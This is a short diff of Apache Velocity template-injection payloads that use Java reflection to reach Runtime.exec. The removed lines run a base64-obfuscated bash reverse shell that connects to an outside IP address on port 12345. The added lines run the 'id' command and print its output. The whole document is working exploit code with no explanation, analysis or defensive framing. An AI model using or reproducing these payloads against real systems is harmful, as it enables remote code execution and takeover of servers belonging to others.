@@ -1,2 +1,6 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC85Ny42NC40MC4xMzIvMTIzNDUgIDA+JjE=}|{base64,-d}|{bash,-i}",null,null).toString();
+#set ($exp = "")
+#set($ex=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#set($chr=$exp.getClass().forName("java.lang.Character"))
+#foreach($i in [1..$out.available()])$exp.valueOf($chr.getDeclaredMethod("toChars",$chr.getDeclaredField("MIN_RADIX").getType()).invoke(null,$out.read()))#end
